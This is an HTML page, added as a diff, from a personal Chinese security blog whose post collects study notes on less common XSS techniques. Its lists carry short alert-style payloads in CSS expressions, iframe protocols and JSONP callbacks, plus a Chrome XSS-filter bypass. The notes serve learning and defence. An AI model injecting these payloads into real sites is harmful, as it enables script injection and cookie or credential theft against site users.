@@ -1,0 +1,922 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Web安全,XSS," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. 其他XSS思路 ▲ 本节部分来自bmjoker大佬的博客内容：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;8805395.html 有一部分来自ahao2333大佬的博客内容：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaomeng2333&#x2F;p&#x2F;11595786.html， 也有部分来自心伤的瘦子@乌云  2. 第三方劫持 (外调J&#x2F;C) 第三方劫持就是把资">
+<meta name="keywords" content="Web安全,XSS">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS--其他XSS思路">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;04&#x2F;02&#x2F;XSS--%E5%85%B6%E4%BB%96XSS%E6%80%9D%E8%B7%AF&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="1. 其他XSS思路 ▲ 本节部分来自bmjoker大佬的博客内容：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;8805395.html 有一部分来自ahao2333大佬的博客内容：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;xiaomeng2333&#x2F;p&#x2F;11595786.html， 也有部分来自心伤的瘦子@乌云  2. 第三方劫持 (外调J&#x2F;C) 第三方劫持就是把资">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-04-02T07:58:04.578Z">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/02/XSS--其他XSS思路/"/>
+
+
+
+
+
+  <title>XSS--其他XSS思路 | Tomas'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tomas'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/XSS--%E5%85%B6%E4%BB%96XSS%E6%80%9D%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS--其他XSS思路</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:01:27+08:00">
+                2020-04-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.7k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h4 id="1-其他XSS思路"><a href="#1-其他XSS思路" class="headerlink" title="1. 其他XSS思路"></a>1. 其他XSS思路</h4><ul>
+<li>▲ 本节部分来自bmjoker大佬的博客内容：<a href="https://www.cnblogs.com/bmjoker/p/8805395.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/8805395.html</a> 有一部分来自ahao2333大佬的博客内容：<a href="https://www.cnblogs.com/xiaomeng2333/p/11595786.html，" target="_blank" rel="noopener">https://www.cnblogs.com/xiaomeng2333/p/11595786.html，</a> 也有部分来自心伤的瘦子@乌云</li>
+</ul>
+<h4 id="2-第三方劫持-外调J-C"><a href="#2-第三方劫持-外调J-C" class="headerlink" title="2. 第三方劫持 (外调J/C)"></a>2. 第三方劫持 (外调J/C)</h4><ul>
+<li>第三方劫持就是把资源域的服务器的权限拿下，替换相关资源，采用’迂回式’的渗透方式</li>
+<li>名字里的”外调”不是从目标网站上插入新的J/C。而是在目标网站上找到不是本站的J/C，然后渗透那个网站，重写J/C，来达到渗透目标网站</li>
+<li>外调：javascript、css、flash、etc、html、SWF</li>
+<li>来自”长短短”的代码，获取非本站的J/C</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0,tags=document.querySelectorAll(&apos;iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]&apos;),tag;tag=tags[i];i++)&#123;</span><br><span class="line">  var a = document.createElement(&apos;a&apos;);</span><br><span class="line">  a.href = tag.src||tag.href||tag.data;</span><br><span class="line">  if(a.hostname!=location.hostname)&#123;</span><br><span class="line">    console.warn(location.hostname+&apos; 发现第三方资源[&apos;+tag.localName+&apos;]:&apos;+a.href);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-XSS-downloader"><a href="#3-XSS-downloader" class="headerlink" title="3. XSS downloader"></a>3. XSS downloader</h4><ul>
+<li>把反射和储蓄结合起来，把核心代码写在网站上，然后以XSS触发并调用代码，实现攻击</li>
+<li>▲ 《XSS跨转脚本攻击剖析与防御》一书中有</li>
+<li>▲ 2020.03.29 看的一知半解，日后再理解</li>
+</ul>
+<h4 id="4-XCS"><a href="#4-XCS" class="headerlink" title="4. XCS"></a>4. XCS</h4><ul>
+<li>XCS就是利用浏览器来玩XSS，它的功能比普通上的XSS还要强大，因为利用浏览器协议漏洞，可以调用浏览器的API来实现下载覆盖本地文件(可以把它这个功能理解为挂马)</li>
+<li>XSC还可以控制浏览器的历史、设置、收藏夹等</li>
+</ul>
+<h4 id="5-页面渲染XSS"><a href="#5-页面渲染XSS" class="headerlink" title="5. 页面渲染XSS"></a>5. 页面渲染XSS</h4><ul>
+<li>jpg(ie6下才会出现)、word里写xss vector的，各种邮箱、网盘等</li>
+<li>假如我当前页面存在txt文件，而txt文件内容为<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>时，就会弹窗。因为浏览器把txt的内容当成html来输出了</li>
+<li>▲ 若站点可以上传txt，且浏览器版本低，此漏洞危害很大</li>
+</ul>
+<h4 id="6-XSF-Flash-XSS"><a href="#6-XSF-Flash-XSS" class="headerlink" title="6. XSF(Flash XSS)"></a>6. XSF(Flash XSS)</h4><ul>
+<li>XSF其实不算XSS的分类中，应该算作XSS的分支，因为在XSS使用到的技巧，在XSF只有一部分可以使用，因为XSF是基于ActionScript2/3.0语言的基础上</li>
+<li>在ActionScript2/3.0里以下几个函数需要重点关注下：getURL、navigateToURL、ExternalInterface.call、ExternalInterface.call、htmlText、addcallback等</li>
+<li>▲ 关乎XSF的，wooyun.tenclent中有大量的例子在云服务器上</li>
+</ul>
+<h4 id="7-XST（Cross-Site-Tracing）"><a href="#7-XST（Cross-Site-Tracing）" class="headerlink" title="7. XST（Cross-Site Tracing）"></a>7. XST（Cross-Site Tracing）</h4><ul>
+<li>跨站追踪，指利用JavaScript发送HTTP的TRACE方法来窃取Cookie值或Basic认证密码的攻击手段</li>
+<li>实际上，现在的主流浏览器都已经能够自己防御XST</li>
+</ul>
+<h4 id="8-CSSXSS"><a href="#8-CSSXSS" class="headerlink" title="8. CSSXSS"></a>8. CSSXSS</h4><ul>
+<li>css代码中利用expression触发xss漏洞<ul>
+<li><code>&lt;div style=&quot;width: expression(alert(&#39;xss&#39;));&gt;</code></li>
+<li><code>&lt;style&gt;body {background-image:expression(alert(&quot;xss&quot;));}&lt;/style&gt;</code></li>
+<li><code>&lt;div style=&quot;list-style-image:url(javascript:alert(&#39;xss&#39;))&quot;&gt;</code></li>
+</ul>
+</li>
+<li>css代码中利用@import触发xss<ul>
+<li><code>&lt;stytle&gt;@import &#39;javascript:alert(&quot;XSS&quot;)&#39;;&lt;/stytle&gt;</code></li>
+</ul>
+</li>
+<li>css代码中使用@import和link方式导入外部含有xss代码的样式表文件<ul>
+<li><code>&lt;link rel=&quot;stytlesheet&quot; href=&quot;http://www.***.com/a.css&quot;&gt;</code></li>
+<li><code>&lt;stytle type=&#39;text/css&#39;&gt;@import url(http://www.*.com/a.css);&lt;/style&gt;</code></li>
+</ul>
+</li>
+<li>▲ xss过滤函数需过滤style标签、style属性、expression、javascript、import等关键字，但实际上，CSSXSS在近几年较少</li>
+<li>▲ IE8的标准中就禁用了expression功能执行JavaScript，但在其他模式中还可以使用</li>
+</ul>
+<h4 id="9-针对HTTP头的思路（一般为PHP语言）"><a href="#9-针对HTTP头的思路（一般为PHP语言）" class="headerlink" title="9. 针对HTTP头的思路（一般为PHP语言）"></a>9. 针对HTTP头的思路（一般为PHP语言）</h4><ul>
+<li>使用Cookie来作为显示参数的值</li>
+<li>使用Referer来作为显示参数的值</li>
+<li>使用User-Agent来作为显示参数的值</li>
+<li>记录IP地址<ul>
+<li>HTTP_X_FORWARDED-FOR() -&gt; 可伪造 -&gt; 火狐插件X-Forwarded-For Header</li>
+<li>HTTP_CLIENT_IP() -&gt; 可伪造 -&gt; 火狐插件Modify Headers</li>
+<li>REMOTE_ADDR() -&gt; 不可伪造</li>
+</ul>
+</li>
+</ul>
+<h4 id="10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）"><a href="#10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）" class="headerlink" title="10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）"></a>10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）</h4><ul>
+<li>▲ 针对不同浏览器，要过滤不同的协议<ul>
+<li>chrome -&gt; data协议</li>
+<li>IE -&gt; vbscript协议（vbscript里 ‘单引号表示注释，类似JS里的//）</li>
+<li>通用 -&gt; javascript协议</li>
+</ul>
+</li>
+<li>onload执行js：<code>&lt;iframe onload=&quot;alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>src 执行javascript代码：<code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>IE下vbscript执行代码：<code>&lt;iframe src=&quot;vbscript:msgbox(1)&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下data协议执行代码：<code>&lt;iframe src=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;/iframe&gt; Chrome</code></li>
+<li>上面的变体：<code>&lt;iframe src=&quot;data:text/html,&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+<li>Chrome下srcdoc属性：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li>
+</ul>
+<h4 id="11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）"><a href="#11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）" class="headerlink" title="11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）"></a>11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）</h4><ul>
+<li>一些程序员会动态的加载json数据，同域的时候，可以使用ajax</li>
+<li>有时候，数据所在域和当前页面所在域又不一致，跨域请求数据的手段中，有种叫做jsonp</li>
+<li>代码表示：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&quot;</code></li>
+<li>可控参数：<code>somescript.src=&quot;http://otherdomain.com/xx?jsonp=callback&amp;id=&quot;+id;</code></li>
+<li>地址的可控<ul>
+<li>script src=”完全可控” ,这种就简单了，直接将地址换为我们的JS地址</li>
+<li>script src=”/path/xxx/[路径可控]/1.js”<ul>
+<li>可以直接上传文本至同域名下，不一定要是HTML文件，需要上传点有过滤缺陷。</li>
+<li>参数可控，利用可用的json接口（script src=”/path/xxx/…/yyy/xx.json?callback=alert(1)”）</li>
+</ul>
+</li>
+<li>script src=”/xxxx/json.php?callback=xxxx&amp;param1=yyy&amp;param2=[参数可控]”情况与地址可控的第二点参数可控类似</li>
+</ul>
+</li>
+</ul>
+<h4 id="12-针对浏览器的过滤器（chrome）"><a href="#12-针对浏览器的过滤器（chrome）" class="headerlink" title="12. 针对浏览器的过滤器（chrome）"></a>12. 针对浏览器的过滤器（chrome）</h4><ul>
+<li>查看是否被浏览器拦截 -&gt; chrome<ul>
+<li>Refused to execute a javascript script.Source code of script found within request</li>
+<li>查看源码 -&gt; 是否被和谐</li>
+</ul>
+</li>
+<li>绕过通用方法<ul>
+<li>要求<ul>
+<li>缺陷点允许&lt;&gt; </li>
+<li>缺陷点运行=</li>
+<li>缺陷点的后方存在<code>&lt;/script&gt;</code>标签</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>构造payload：<code>&lt;script src=data:,alert(1)&lt;!--</code></li>
+<li>▲ 一般过滤器的规则，是觉得是恶意代码的才会去拦截，可以利用代码，去绕过规则</li>
+<li>▲ IE等其他浏览器的过滤器暂无找到资料</li>
+</ul>
+<h4 id="13-富文本操作"><a href="#13-富文本操作" class="headerlink" title="13. 富文本操作"></a>13. 富文本操作</h4><ul>
+<li>白名单，即：只允许使用白名单内的合法HTML标签，例如IMG，其它均剔除</li>
+<li>黑名单，即：厂商会构建一个有危害的HTML标签、属性列表，然后通过分析用户提交的HTML代码，剔除其中有害的部分</li>
+<li>▲ 白名单要安全得多，而黑名单的方式则经常会被绕过</li>
+<li>▲ 当所有的思路走不通时，可以用富文本，大量的payload去碰撞，用bp进行抓包修改</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/04/02/XSS--%E5%B7%A5%E5%85%B7%E6%8C%96%E6%8E%98/" rel="next" title="XSS--工具挖掘">
+                <i class="fa fa-chevron-left"></i> XSS--工具挖掘
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/04/02/XSS--%E6%89%8B%E5%B7%A5%E6%8C%96%E6%8E%98/" rel="prev" title="XSS--手工挖掘">
+                XSS--手工挖掘 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/photo.jpg"
+                alt="Tomas" />
+            
+              <p class="site-author-name" itemprop="name">Tomas</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">181</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-其他XSS思路"><span class="nav-number">1.</span> <span class="nav-text">1. 其他XSS思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-第三方劫持-外调J-C"><span class="nav-number">2.</span> <span class="nav-text">2. 第三方劫持 (外调J/C)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-XSS-downloader"><span class="nav-number">3.</span> <span class="nav-text">3. XSS downloader</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-XCS"><span class="nav-number">4.</span> <span class="nav-text">4. XCS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#5-页面渲染XSS"><span class="nav-number">5.</span> <span class="nav-text">5. 页面渲染XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#6-XSF-Flash-XSS"><span class="nav-number">6.</span> <span class="nav-text">6. XSF(Flash XSS)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#7-XST（Cross-Site-Tracing）"><span class="nav-number">7.</span> <span class="nav-text">7. XST（Cross-Site Tracing）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#8-CSSXSS"><span class="nav-number">8.</span> <span class="nav-text">8. CSSXSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#9-针对HTTP头的思路（一般为PHP语言）"><span class="nav-number">9.</span> <span class="nav-text">9. 针对HTTP头的思路（一般为PHP语言）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#10-针对DOM中iframe的思路（-路径可控-问题，iframe中的输出可以控制）"><span class="nav-number">10.</span> <span class="nav-text">10. 针对DOM中iframe的思路（[路径可控]问题，iframe中的输出可以控制）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#11-针对JSONP中地址的可控（callback参数的限制以及自定义参数）"><span class="nav-number">11.</span> <span class="nav-text">11. 针对JSONP中地址的可控（callback参数的限制以及自定义参数）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#12-针对浏览器的过滤器（chrome）"><span class="nav-number">12.</span> <span class="nav-text">12. 针对浏览器的过滤器（chrome）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#13-富文本操作"><span class="nav-number">13.</span> <span class="nav-text">13. 富文本操作</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tomas</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">176.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
